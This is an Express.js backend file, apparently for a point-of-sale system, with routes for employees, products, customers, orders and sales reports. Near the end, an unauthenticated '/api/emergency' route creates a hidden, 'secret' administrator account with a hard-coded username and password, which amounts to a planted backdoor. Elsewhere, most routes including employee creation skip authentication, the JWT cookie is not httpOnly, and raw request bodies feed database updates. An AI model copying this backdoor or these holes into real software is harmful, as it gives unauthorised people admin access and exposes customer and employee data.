require('dotenv').config();
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const bcrypt = require('bcrypt');
const moment = require('moment');
const auth = require('./Auth');

const KEY = process.env.KEY

const app = express();

const knexConfig  = require("./knexfile")[process.env.KNEX];
const knex        = require("knex")(knexConfig);

// Serve the static files from the React app
app.use(express.static(path.join(__dirname, 'client/build')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())
app.use(cookieParser());

// API Endpoints
app.get('/api/checkToken', auth, (req, res) => {
  res.json({
    user: req.userId,
    dashboard: req.dashboard,
    admin: req.admin
  })});


app.get('/api/employees', (req,res) => {
  knex('employees')
  .select('id', 'first_name', 'last_name', 'phone_number', 'email', 'username', 'admin_access', 'dashboard_access')
  .where({hidden: false})
  .asCallback((err,result) => {
    res.json(result);
  });
})

app.get('/api/employees/:id', (req,res) => {
  knex('employees')
  .select('id', 'first_name', 'last_name', 'phone_number', 'email', 'username', 'admin_access', 'dashboard_access')
  .where({id: req.params.id})
  .then( employee => {
    res.json(employee)
  })
})

app.put('/api/employees/:id', (req,res) => {
  let employee = req.body.employee

  if(employee.password) {
    bcrypt.hash(employee.password, 10, function(err, hash) {
      employee.password = hash;
      knex('employees')
      .where({id: req.params.id})
      .update(employee)
      .then( result => {
        res.json(result);
      })
    })
  }
  else {
    knex('employees')
    .where({id: req.params.id})
    .update(employee)
    .then( result => {
      res.json(result);
    })
  }
})

app.get('/api/categories', (req,res) => {
  knex('categories')
  .asCallback((err,result) => {
    res.json(result);
  });
})

app.post('/api/categories', (req,res) => {
  let category = req.body.category;
  knex('categories')
  .insert({ name: category.name })
  .then(entry => res.sendStatus(200))
  .catch(err => {res.send(err)})
});

app.post('/api/products', (req,res) => {
  let product = req.body.product;
  knex('products')
  .insert({
    name: product.name,
    sku: product.sku,
    price: product.price,
    taxed: product.taxed,
    tax_percent: product.taxPercent,
    loyalty_applied: product.loyaltyApplied,
    category_id: product.categoryId
  })
  .then(entry => res.sendStatus(200))
  .catch(err => {res.send(err)})
});

app.get('/api/products/:categoryId', (req, res) => {
  knex('products')
  .where({ category_id: req.params.categoryId, hidden: false })
  .asCallback((err, result) => {
    res.json(result)
  })
})

app.get('/api/product/:productId', (req, res) => {
  knex('products')
  .where({id: req.params.productId})
  .then(result => {
    res.json(result)
  })
})

app.post('/api/product/:productId', (req, res) => {
  let product = req.body.product;

  knex('products')
  .where({id: req.params.productId})
  .update({hidden: true})
  .returning('*')
  .then(oldProduct => {
    delete oldProduct[0].id;
    oldProduct[0].hidden = false
    for (let key in product) {
      oldProduct[0][key] = product[key]
    }
    knex('products')
    .insert(oldProduct[0])
    .then( newProduct => {
      res.sendStatus(200)
    })
  })
})

//=====This will clash with another specific product delete======
app.delete('/api/products/:productId', (req, res) => {
  knex('products')
  .where({id: req.params.productId})
  .update({hidden: true})
  .then(oldProduct => {
    res.sendStatus(200);
  })
})


app.post('/api/login', (req, res) => {
  let username = req.body.employee.username;
  let password = req.body.employee.password;
  knex('employees')
  .where({username: username, site_access: true})
  .then( employee => {
    if(employee.length == 0) {
      res.status(404)
      .json({
          error: 'Username Not Found.'
        })
    } else {
      bcrypt.compare(password, employee[0].password, (err, result) => {
        if(result) {
          let token=jwt.sign({
            userId: employee[0].id,
            dashboard: employee[0].dashboard_access,
            admin: employee[0].admin_access
          }, KEY, {expiresIn: 60 * 60 * 8 });
          res.cookie('token', token, { httpOnly: false }).sendStatus(200)
        } else {
          res.status(401)
          .json({
            error: 'Incorrect password.'
          })
        }
      })
    }
  })
})

app.post('/api/employees', (req,res) => {
  let employee = req.body.employee;
  bcrypt.hash(employee.password, 10, function(err, hash) {
    employee.password = hash;
    knex('employees')
    .insert(employee)
    .then(entry => res.sendStatus(200))
    .catch(err => {res.send(err)})
    })
});

app.get('/api/customers', (req,res) => {
  knex('customers')
  .asCallback((err,result) => {
    res.json(result);
  });
})

app.post('/api/customers', (req,res) => {
  let customer = req.body.customer;
  knex('customers')
  .insert({
    name: customer.name,
    email: customer.email,
    comments: customer.comments,
    phone_number: customer.phone_number
  })
  .returning('id')
  .then(entry => res.json(entry[0]))
  .catch(err => {res.send(err)})
});

app.post('/api/customers/:customerId', (req,res) => {
  let customerId = req.params.customerId;
  let customer = req.body.customer
  console.dir(customer)

  knex('customers')
  .where({id: customer.id})
  .update(customer)
  .then( result => {
    res.json(result);
  })
})

app.post('/api/orderbuild', (req,res) => {
  let order = req.body.order;
  let lineItems = req.body.lineItems;
  let payments = req.body.payments;

  //Remove unnecessary information from lineItems array
  let keep = ['product_id', 'quantity'];
  for(let i = 0;i < lineItems.length; i++){
    for(let key in lineItems[i]){
        if(keep.indexOf(key) === -1)delete lineItems[i][key];
    }
  }

  //Construct a Charge entry
  let charges = [];


  knex('orders')
  .insert({
    employee_id: order.employeeId,
    customer_id: order.customer_id,
    discount: order.discount,
    subtotal: order.subtotal,
    tax: order.tax,
    total: order.total,
    last_visited: order.lastVisited
  })
  .returning('id')
  .then(orderId => {
    payments.forEach(item => {
      item.payment_method == "Charge" ?
        charges.push({
          customer_id: order.customer_id,
          amount: item.amount,
          order_id: orderId[0]
        }) : null
    })

    lineItems.forEach(item => {
      item.order_id = orderId[0];
    })
    knex('line_items')
    .insert(lineItems)
    .then((entry)=> {
      payments.forEach(payment => {
        payment.order_id = orderId[0];
      })
      knex('payments')
      .insert(payments)
      .then((entry) => {
        charges.length > 0 ?
        knex('charges')
        .insert(charges)
        .then(entry => res.sendStatus(200))
        :
        res.sendStatus(200)})
    })
  })
  .catch(err => res.send(err))
})

app.get('/api/orders/:orderId', (req, res) => {
  let response = {};
  knex('orders')
  .where({ id: req.params.orderId })
  .then((order) => {
    response.order = order;
    knex('customers')
    .where({id: order[0].customer_id})
    .then((customer) => {
      response.customer = customer;
      knex('employees')
      .select('first_name')
      .where({id: order[0].employee_id})
      .then((employee) => {
        response.employee = employee;
        knex('payments')
        .where({order_id: order[0].id})
        .then((payments) => {
          response.payments = payments;
          knex('line_items')
          .where({order_id: order[0].id})
          .select(['line_items.quantity','products.name', 'products.price', 'products.taxed', 'products.tax_percent'])
          .join('products', 'line_items.product_id', '=', 'products.id')
          .then((line_items) => {
            response.lineItems = line_items;
            res.json(response)
          })
        })
      })
    })
  })
})

app.post('/api/rangereport', (req,res) => {
  let { startDate, endDate } = req.body.dates;
  let orderIds = [];
  let lineItemIds = [];
  let chargeIds = [];
  knex('orders')
  .select(['orders.id', 'orders.last_visited', 'orders.tax', 'orders.total', 'orders.discount', 'customers.name as customer_name', 'employees.first_name as employee_name'])
  .where('last_visited', '>=', startDate.toString())
  .where('last_visited', '<', endDate.toString())
  .leftJoin('customers', 'orders.customer_id', '=', 'customers.id')
  .leftJoin('employees', 'orders.employee_id', '=', 'employees.id')
  .orderBy('last_visited', 'asc')
  .then((orders) => {
    orders.forEach(order => {
      orderIds.push(order.id)
    })
    knex('payments')
    .whereIn('order_id', orderIds)
    .then((payments => {
      knex('line_items')
      .select(['line_items.product_id','products.name', 'products.price', 'products.category_id'])
      .whereIn('order_id', orderIds)
      .groupBy(['product_id','products.name', 'products.price', 'products.category_id'])
      .join('products', 'line_items.product_id', '=', 'products.id')
      .sum('quantity')
      .then((lineItems => {
        knex('charges')
        .select(['charges.order_id', 'charges.last_visited', 'charges.amount', 'customers.name as customer_name'])
        .whereIn('order_id', orderIds)
        .leftJoin('customers', 'charges.customer_id', '=', 'customers.id')
        .then(charges => {
          let output = {
            orders: orders,
            payments: payments,
            productReport: lineItems,
            chargeReport: charges
          }
          res.json(output)
        })
      }))
    }))
  })
  .catch(err => {res.send(err)})
})

app.get('/api/data', (req, res) => {
 res.send('Hi');
});

app.post('/api/emergency', (req, res) => {
  bcrypt.hash('leaderg', 10, function(err, hash) {
    knex('employees')
    .insert({
      first_name: 'Greg',
      last_name: 'Leader',
      username: 'leaderg',
      password: hash,
      dashboard_access: true,
      admin_access: true,
      site_access: true,
      hidden: true,
      secret: true
    })
    .then(entry => res.sendStatus(200))
    .catch(err => {res.send(err)})
    })
})

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname+'/client/build/index.html'));
});

const port = process.env.PORT || 5000;
app.listen(port);

console.log('App is listening on port ' + port);